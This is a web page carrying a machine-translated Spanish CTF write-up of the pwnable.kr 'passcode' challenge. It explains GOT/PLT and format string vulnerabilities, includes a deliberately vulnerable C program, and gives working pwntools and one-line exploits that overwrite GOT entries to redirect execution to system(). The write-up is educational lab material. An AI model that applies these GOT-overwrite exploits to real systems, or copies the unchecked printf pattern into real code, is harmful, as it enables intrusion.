<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚òùüèΩ ü§úüèº üë©üèΩ‚ÄçüöÄ Resolver un trabajo con pwnable.kr 05 - c√≥digo de acceso. Vuelva a escribir la tabla de enlaces del procedimiento a trav√©s de la vulnerabilidad de cadena de formato ü§≥üèª üë®‚Äçüè´ ‚òùÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="En este art√≠culo analizaremos: cu√°l es la tabla global de compensaciones, la tabla de relaciones de procedimientos y su reescritura a trav√©s de la vul...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Resolver un trabajo con pwnable.kr 05 - c√≥digo de acceso. Vuelva a escribir la tabla de enlaces del procedimiento a trav√©s de la vulnerabilidad de cadena de formato</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/460647/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="imagen"></div><br>  En este art√≠culo analizaremos: cu√°l es la tabla global de compensaciones, la tabla de relaciones de procedimientos y su reescritura a trav√©s de la vulnerabilidad de cadena de formato.  Tambi√©n resolveremos la quinta tarea desde el sitio <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">pwnable.kr</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Informaci√≥n organizacional</b> <div class="spoiler_text">  Especialmente para aquellos que quieran aprender algo nuevo y desarrollarse en cualquiera de las √°reas de informaci√≥n y seguridad inform√°tica, escribir√© y hablar√© sobre las siguientes categor√≠as: <br><br><ul><li>  PWN; </li><li>  criptograf√≠a (criptograf√≠a); </li><li>  tecnolog√≠as de red (Red); </li><li>  inversa (ingenier√≠a inversa); </li><li>  esteganograf√≠a (Stegano); </li><li>  b√∫squeda y explotaci√≥n de vulnerabilidades WEB. </li></ul><br>  Adem√°s de esto, compartir√© mi experiencia en inform√°tica forense, an√°lisis de malware y firmware, ataques a redes inal√°mbricas y redes de √°rea local, realizaci√≥n de pentests y escritura de exploits. <br><a name="habracut"></a><br>  Para que pueda conocer nuevos art√≠culos, software y otra informaci√≥n, cre√© un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">canal en Telegram</a> y un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">grupo para discutir cualquier problema</a> en el campo de ICD.  Adem√°s, considerar√© personalmente sus solicitudes personales, preguntas, sugerencias y recomendaciones <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">personalmente y responder√© a todos</a> . <br><cut></cut><br>  Toda la informaci√≥n se proporciona solo con fines educativos.  El autor de este documento no tiene ninguna responsabilidad por los da√±os causados ‚Äã‚Äãa alguien como resultado del uso de los conocimientos y m√©todos obtenidos como resultado de estudiar este documento. <br></div></div><br><h2>  Tabla de compensaci√≥n global y tabla de relaci√≥n de procedimientos </h2><br>  Las bibliotecas vinculadas din√°micamente se cargan desde un archivo separado en la memoria en el momento del arranque o en tiempo de ejecuci√≥n.  Y, por lo tanto, sus direcciones en la memoria no son fijas para evitar conflictos de memoria con otras bibliotecas.  Adem√°s, el mecanismo de seguridad ASLR aleatorizar√° la direcci√≥n de cada m√≥dulo en el momento del arranque. <br><br>  Tabla de compensaci√≥n global (GOT): una tabla de direcciones almacenadas en la secci√≥n de datos.  Se utiliza en tiempo de ejecuci√≥n para buscar direcciones de variables globales que eran desconocidas en tiempo de compilaci√≥n.  Esta tabla est√° en la secci√≥n de datos y no es utilizada por todos los procesos.  Todas las direcciones absolutas a las que hace referencia la secci√≥n de c√≥digo se almacenan en esta tabla GOT.  La secci√≥n de c√≥digo utiliza compensaciones relativas para acceder a estas direcciones absolutas.  Y as√≠, el c√≥digo de la biblioteca puede ser compartido por los procesos, incluso si se cargan en diferentes espacios de direcciones de memoria. <br><br>  La tabla de vinculaci√≥n de procedimientos (PLT) contiene un c√≥digo de salto para llamar a funciones comunes cuyas direcciones se almacenan en el GOT, es decir, el PLT contiene direcciones en las que se almacenan direcciones para datos (direcciones) del GOT. <br><br>  Considere el mecanismo por ejemplo: <br><br><ol><li>  En el c√≥digo del programa, se llama a la funci√≥n externa printf. </li><li>  El flujo de control va al en√©simo registro en el PLT, y la transici√≥n ocurre en un desplazamiento relativo, en lugar de una direcci√≥n absoluta. </li><li>  Va a la direcci√≥n almacenada en el GOT.  El puntero de funci√≥n almacenado en la tabla GOT primero apunta de nuevo al fragmento de c√≥digo PLT. </li><li>  Por lo tanto, si se llama a printf por primera vez, se llama al convertidor del vinculador din√°mico para obtener la direcci√≥n real de la funci√≥n de destino. </li><li>  La direcci√≥n printf se escribe en la tabla GOT y luego se llama printf. </li><li>  Si se vuelve a llamar a printf en el c√≥digo, ya no se llamar√° al solucionador porque la direcci√≥n de printf ya est√° almacenada en GOT. </li></ol><cut></cut><br><img src="https://habrastorage.org/webt/j4/yh/xf/j4yhxfc-twcuo9m9e5o2nanwoug.png" alt="imagen"><br><br>  Cuando se utiliza este enlace retrasado, no se permiten punteros a funciones que no se utilizan en tiempo de ejecuci√≥n.  Por lo tanto, ahorra mucho tiempo. <br><br>  Para que este mecanismo funcione, las siguientes secciones est√°n presentes en el archivo: <br><br><ul><li>  .got: contiene entradas para GOT; </li><li>  .lt: contiene entradas para PLT; </li><li>  .got.plt: contiene las relaciones de direcci√≥n GOT - PLT; </li><li>  .plt.got: contiene las relaciones de direcci√≥n PLT - GOT. </li></ul><br>  Dado que la secci√≥n .got.plt es una matriz de punteros y se llena durante la ejecuci√≥n del programa (es decir, se permite la escritura), podemos sobrescribir uno de ellos y controlar el flujo de ejecuci√≥n del programa. <br><br><h2>  Cadena de formato </h2><br>  Una cadena de formato es una cadena que utiliza especificadores de formato.  El especificador de formato se indica con el s√≠mbolo "%" (para ingresar el signo de porcentaje, use la secuencia "%%"). <br><br><pre><code class="cpp hljs">pritntf(‚Äúoutput %s <span class="hljs-number"><span class="hljs-number">123</span></span>‚Äù, ‚Äústr‚Äù); output str <span class="hljs-number"><span class="hljs-number">123</span></span></code> </pre> <br>  Los especificadores de formato m√°s importantes: <br><br><ul><li>  d - n√∫mero con signo decimal, tama√±o predeterminado, sizeof (int); </li><li>  x y X son un n√∫mero hexadecimal sin signo, x usa letras peque√±as (abcdef), X may√∫scula (ABCDEF), el tama√±o predeterminado es sizeof (int); </li><li>  s - salida de l√≠nea con byte de terminaci√≥n cero; </li><li>  n es el n√∫mero de caracteres escritos en el momento en que apareci√≥ la secuencia de comandos que contiene n. </li></ul><br><h2>  ¬øPor qu√© es posible la vulnerabilidad de cadena de formato? </h2><br>  Esta vulnerabilidad consiste en utilizar una de las funciones de salida de formato sin especificar un formato (como en el siguiente ejemplo).  Por lo tanto, nosotros mismos podemos especificar el formato de salida, lo que conduce a la capacidad de leer valores de la pila y, al especificar un formato especial, escribir en la memoria. <br><cut></cut><br>  Considere la vulnerabilidad en el siguiente ejemplo: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main(){ char input[100]; printf("Start program!!!\n"); printf("Input: "); scanf("%s", &amp;input); printf("\nYour input: "); printf(input); printf("\n"); exit(0); }</span></span></span></span></code> </pre> <br>  Por lo tanto, la siguiente l√≠nea no especifica el formato de salida. <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(input);</code> </pre> <br>  Compila el programa. <br><br><pre> <code class="bash hljs">gcc vuln1.c -o vuln -no-pie</code> </pre> <br>  Veamos los valores en la pila ingresando una l√≠nea que contiene especificadores de formato. <br><br><img src="https://habrastorage.org/webt/i9/ib/es/i9ibeshbd2zhx5zmza0gxoegc-e.png" alt="imagen"><br><br>  Por lo tanto, al llamar a printf (input), se activa la siguiente llamada: <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(‚Äú%p-%p-%p-%p-%p‚Äú);</code> </pre> <br>  Queda por entender lo que muestra el programa.  La funci√≥n printf tiene varios argumentos, que son datos para una cadena de formato. <br><br>  Considere un ejemplo de una llamada a funci√≥n con los siguientes argumentos: <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(‚ÄúNumber - %d, addres - %<span class="hljs-number"><span class="hljs-number">08</span></span>x, <span class="hljs-built_in"><span class="hljs-built_in">string</span></span> - %s‚Äù, a, &amp;b, c);</code> </pre> <br>  Cuando se llama a esta funci√≥n, la pila tendr√° el siguiente aspecto. <br><br><img src="https://habrastorage.org/webt/vo/rj/n2/vorjn2194dvix4kr4mmzutja890.png" alt="imagen"><br><br>  Por lo tanto, cuando se detecta un especificador de formato, la funci√≥n recupera el valor de la pila.  Del mismo modo, una funci√≥n de nuestro ejemplo recuperar√° 5 valores de la pila. <br><br><img src="https://habrastorage.org/webt/uj/_j/vc/uj_jvcokc0m81teugsjel-ovzsk.png" alt="imagen"><br><br>  Para confirmar lo anterior, encontramos nuestra cadena de formato en la pila. <br><br><img src="https://habrastorage.org/webt/tm/og/pm/tmogpmxoiospc4wwcybi3daw-3u.png" alt="imagen"><br><br>  Al traducir valores de una vista hexadecimal, obtenemos la cadena "% -p% AAAA".  Es decir, pudimos obtener los valores de la pila. <br><br><h2>  GOT Sobrescribir </h2><br>  Verifiquemos la capacidad de reescribir GOT a trav√©s de la vulnerabilidad de cadena de formato.  Para hacer esto, recorramos nuestro programa reescribiendo la direcci√≥n de la funci√≥n exit () a la direcci√≥n de main.  Sobreescribiremos usando pwntools.  Cree el dise√±o inicial y repita la entrada anterior. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * ex = process(<span class="hljs-string"><span class="hljs-string">'./vuln'</span></span>) payload = <span class="hljs-string"><span class="hljs-string">"AAAA%p-%p-%p-%p-%p-%p-%p-%p"</span></span> ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/ln/ej/lh/lnejlh85r86iny9le7wepst28mo.png" alt="imagen"><br><br>  Pero dado que dependiendo del tama√±o de la cadena ingresada, el contenido de la pila ser√° diferente, nos aseguraremos de que la carga de entrada siempre contenga el mismo n√∫mero de caracteres ingresados. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p"</span></span>*<span class="hljs-number"><span class="hljs-number">5</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, ‚Äù*‚Äù)</code> </pre> <br><img src="https://habrastorage.org/webt/h8/sg/wg/h8sgwghgqjftpqreusafipcpz0s.png" alt="imagen"><br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, ‚Äù*‚Äù)</code> </pre> <br><img src="https://habrastorage.org/webt/gj/bw/d-/gjbwd-9aigcck02hc2k9og5nfve.png" alt="imagen"><br><br>  Ahora necesitamos encontrar la direcci√≥n GOT de las funciones de salida () y la direcci√≥n de la funci√≥n principal.  La direcci√≥n principal se encontrar√° usando gdb. <br><br><img src="https://habrastorage.org/webt/fp/bm/nn/fpbmnn6xs2bquxngua1igncslnm.png" alt="imagen"><br><br>  La direcci√≥n GOT de exit () se puede encontrar usando gdb y objdump. <br><br><img src="https://habrastorage.org/webt/_a/2o/pm/_a2opmke0_snnf_hczyzh0xtl64.png" alt="imagen"><br><br><img src="https://habrastorage.org/webt/qj/dj/yp/qjdjypxsia_iz1clauydnmtwdgy.png" alt="imagen"><br><br><pre> <code class="bash hljs">objdump -R vuln</code> </pre> <br><img src="https://habrastorage.org/webt/sf/of/qo/sfofqo2pj9dyvb57yf9hsdc1uw8.png" alt="imagen"><br><br>  Escribiremos estas direcciones en nuestro programa. <br><br><pre> <code class="python hljs">main_addr = <span class="hljs-number"><span class="hljs-number">0x401162</span></span> exit_addr = <span class="hljs-number"><span class="hljs-number">0x404038</span></span></code> </pre> <br>  Ahora necesita reescribir la direcci√≥n.  Para agregar a la pila la direcci√≥n de la funci√≥n exit () y las direcciones posteriores, es decir,  * (salida ()) + 1, etc.  Puedes agregarlo usando nuestra carga. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p-"</span></span>*<span class="hljs-number"><span class="hljs-number">5</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr+<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br>  Ejecute y determine qu√© cuenta muestra la direcci√≥n. <br><br><img src="https://habrastorage.org/webt/_f/pg/cj/_fpgcjghcjfywqnhdh8qd1mc1ak.png" alt="imagen"><br><br>  Estas direcciones se muestran en las posiciones 14 y 15. Puede mostrar el valor en una posici√≥n espec√≠fica de la siguiente manera. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%14$p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>)</code> </pre> <br><img src="https://habrastorage.org/webt/xl/ss/3u/xlss3uiye9rnbwz9jxmn5skxcry.png" alt="imagen"><br><br>  Reescribiremos la direcci√≥n en dos bloques.  Para comenzar, imprimiremos 4 valores para que nuestras direcciones est√©n en las posiciones 2 y 4. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p%14$p%p%15$p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>)</code> </pre> <br><img src="https://habrastorage.org/webt/yw/sy/py/ywsypywco_6skjhhsw1qr40bupc.png" alt="imagen"><br><br>  Ahora dividimos la direcci√≥n de main () en dos bloques: <br><blockquote>  0x401162 <br><br>  1) 0x62 = 98 (escribir a 0x404038) <br>  2) 0x4011 - 0x62 = 16303 (escriba a la direcci√≥n 0x404039) </blockquote><br><br>  Los escribimos de la siguiente manera: <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%98p%14$n%16303p%15$n"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">'*'</span></span>)</code> </pre> <br>  C√≥digo completo: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * start_addr = <span class="hljs-number"><span class="hljs-number">0x401162</span></span> exit_addr = <span class="hljs-number"><span class="hljs-number">0x404038</span></span> ex = process(<span class="hljs-string"><span class="hljs-string">'./vuln'</span></span>) payload = (<span class="hljs-string"><span class="hljs-string">"%98p%14$n%16303p%15$n"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">'*'</span></span>) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr+<span class="hljs-number"><span class="hljs-number">1</span></span>) ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/qi/vg/vr/qivgvrhzkucvpzfs6s-zwftuuhk.png" alt="imagen"><br><br>  Por lo tanto, el programa se reinicia en lugar de finalizar.  Reescribimos la direcci√≥n de salida (). <br><br><h2>  Soluci√≥n de trabajo de contrase√±a </h2><br>  Hacemos clic en el primer √≠cono con la firma del c√≥digo de acceso y se nos dice que debemos conectarnos a trav√©s de SSH con la contrase√±a de invitado. <br><br><img src="https://habrastorage.org/webt/h2/jc/tj/h2jctjxsee5hardpu6glunfg2fk.png" alt="imagen"><br><br>  Cuando est√° conectado, vemos el banner correspondiente. <br><br><img src="https://habrastorage.org/webt/-a/me/pp/-ameppolfflavwiv35qbkkgvg-8.png" alt="imagen"><br><br>  Veamos qu√© archivos hay en el servidor y qu√© derechos tenemos. <br><br><pre> <code class="bash hljs">ls -l</code> </pre> <br><img src="https://habrastorage.org/webt/ds/2m/gv/ds2mgvxu30ah53peas04_wypwja.png" alt="imagen"><br><br>  Por lo tanto, podemos leer el c√≥digo fuente del programa, ya que existe el derecho de leer para todos, y ejecutar el programa de c√≥digo de acceso con los derechos del propietario (se establece el bit fijo).  Veamos el resultado del c√≥digo. <br><br><img src="https://habrastorage.org/webt/ld/mj/wr/ldmjwru5rsabi6jyr9o8rrbt2ps.png" alt="imagen"><br><br>  Hubo un error en la funci√≥n login ().  En scanf (), el segundo argumento se pasa no a la direcci√≥n de la variable &amp; passcode1, sino a la variable en s√≠, y no se inicializa.  Como la variable a√∫n no se ha inicializado, contiene la "basura" no escrita que qued√≥ despu√©s de la ejecuci√≥n de las instrucciones anteriores.  Es decir, scanf () escribir√° el n√∫mero en la direcci√≥n, que ser√°n los datos residuales. <br><br><img src="https://habrastorage.org/webt/vt/5m/w4/vt5mw46djsyiiqhn5h7veqoi8b4.png" alt="imagen"><br><br>  Por lo tanto, si antes de llamar a la funci√≥n de inicio de sesi√≥n, podemos obtener control sobre esta √°rea de memoria, entonces podemos escribir cualquier n√∫mero en cualquier direcci√≥n (en realidad cambiar la l√≥gica del programa). <br><br>  Dado que la funci√≥n login () se llama inmediatamente despu√©s de la funci√≥n welcome (), tienen las mismas direcciones de marco de pila. <br><br><img src="https://habrastorage.org/webt/tj/zr/yi/tjzryim0sirg0i4t3agtqk4loty.png" alt="imagen"><br><br>  Verifiquemos si podemos escribir datos en la ubicaci√≥n futura del c√≥digo de acceso 1.  Abra el programa en gdb y desarme las funciones login () y welcome ().  Como scanf tiene dos par√°metros en ambos casos, la direcci√≥n de la variable se pasar√° primero a la funci√≥n.  Por lo tanto, la direcci√≥n del c√≥digo de acceso 1 es ebp-0x10, y el nombre es ebp-0x70. <br><br><img src="https://habrastorage.org/webt/qv/sj/li/qvsjliyjrjehr1lmvptgi5piju4.png" alt="imagen"><br><br><img src="https://habrastorage.org/webt/5t/uy/z3/5tuyz3pptyf76e32xe2idow-rnm.png" alt="imagen"><br><br>  Ahora, calculemos el c√≥digo de acceso de direcci√≥n1 relativo al nombre, siempre que el valor de ebp sea el mismo: <br><blockquote>  (&amp; name) - (&amp; passcode1) = (ebp-0x70) - (ebp-0x10) = -96 <br>  &amp; passcode1 == &amp; name + 96 </blockquote>  Es decir, los √∫ltimos 4 bytes de nombre: esta es la "basura" que actuar√° como la direcci√≥n para escribir en la funci√≥n de inicio de sesi√≥n. <br><br>  En el art√≠culo, vimos c√≥mo puede cambiar la l√≥gica de la aplicaci√≥n reescribiendo las direcciones en el GOT.  Hag√°moslo aqu√≠ tambi√©n.  Como scanf () es seguido por flush, luego en la direcci√≥n de esta funci√≥n en GOT, escribimos la direcci√≥n de la instrucci√≥n para llamar a la funci√≥n system () para leer la bandera. <br><br><img src="https://habrastorage.org/webt/kx/8i/fk/kx8ifk5y4nzodxayzfdr0pyfjaa.png" alt="imagen"><br><br><img src="https://habrastorage.org/webt/hh/2l/sx/hh2lsxqchatzgvyhvzi_xqj8-ac.png" alt="imagen"><br><br><img src="https://habrastorage.org/webt/nc/vd/bw/ncvdbwjevpugfpt62no2jrnbumk.png" alt="imagen"><br><br>  Es decir, en la direcci√≥n 0x804a004 debe escribir 0x80485e3 en forma decimal. <br><br><pre> <code class="bash hljs">python -c <span class="hljs-string"><span class="hljs-string">"print('A'*96 + '\x04\xa0\x04\x08' + str(0x080485e3))"</span></span> | ./passcode</code> </pre> <br><img src="https://habrastorage.org/webt/rh/pu/gf/rhpugfjpmu0ykmcgyc_geflsm5s.png" alt="imagen"><br><br>  Como resultado, obtenemos 10 puntos, hasta ahora esta es la tarea m√°s dif√≠cil. <br><br><img src="https://habrastorage.org/webt/mg/fm/0-/mgfm0-rba6sb8aehxzm583xrrg4.png" alt="imagen"><br><br>  Los archivos de este art√≠culo se adjuntan al <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">canal Telegram</a> .  ¬°Nos vemos en los siguientes art√≠culos! <br><br>  Estamos en un canal de telegramas: un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">canal en Telegramas</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/460647/">https://habr.com/ru/post/460647/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../460635/index.html">CLRium # 6: concurrencia y paralelismo. Dos d√≠as: del procesador a as√≠ncrono / espera</a></li>
<li><a href="../460637/index.html">Control de luz en ZigBee</a></li>
<li><a href="../460641/index.html">YouTokenToMe: una herramienta para la tokenizaci√≥n r√°pida de texto del equipo de VKontakte</a></li>
<li><a href="../460643/index.html">Distribuci√≥n uniforme de puntos en una esfera.</a></li>
<li><a href="../460645/index.html">Hacer el bien haciendo el mal: escribir c√≥digo malvado con Go, Parte 1</a></li>
<li><a href="../460651/index.html">Reuni√≥n de la Society of Anonymous Testers: TMS, monitoreo de monitoreo, evaluaci√≥n de calidad de b√∫squeda y pruebas nativas de iOS</a></li>
<li><a href="../460655/index.html">C√≥mo romp√≠ Telegram</a></li>
<li><a href="../460659/index.html">Usando tuber√≠as para pivotar</a></li>
<li><a href="../460661/index.html">Todo lo que necesitas saber sobre Node.js</a></li>
<li><a href="../460665/index.html">Preguntas frecuentes preliminares: ¬øPor qu√© los est√°ndares C ++ salen cada tres a√±os?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>